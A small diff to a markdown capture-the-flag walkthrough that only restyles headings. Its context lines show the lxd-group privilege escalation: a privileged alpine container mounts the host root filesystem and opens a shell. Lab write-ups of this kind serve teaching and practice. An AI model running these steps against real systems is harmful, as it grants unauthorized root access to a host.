@@ -87,19 +87,19 @@ exploited. Luckly lxd (container service) is present and accessible by _c0ldd_ u
 Lets exploit this service, Download the vulnerable container image using [alpine for lxd](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
 cd to download dir and start http server and transfer the file to target machine.
 
-> Add the image :
+**Add the image :**
 ```bash 
 $ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 $ lxc image list -- You can see your new imported image
 ```
-> Create a container and add root path
+**Create a container and add root path**
 ```bash
 $ lxc init alpine privesc -c security.privileged=true
 $ lxc list 
 $ lxc config device add privesc host-root disk source=/ path=/mnt/root
 recursive=true
 ```
-> Execute the container:
+**Execute the container:**
 ```bash
 $ lxc start privesc
 $ lxc exec privesc /bin/sh
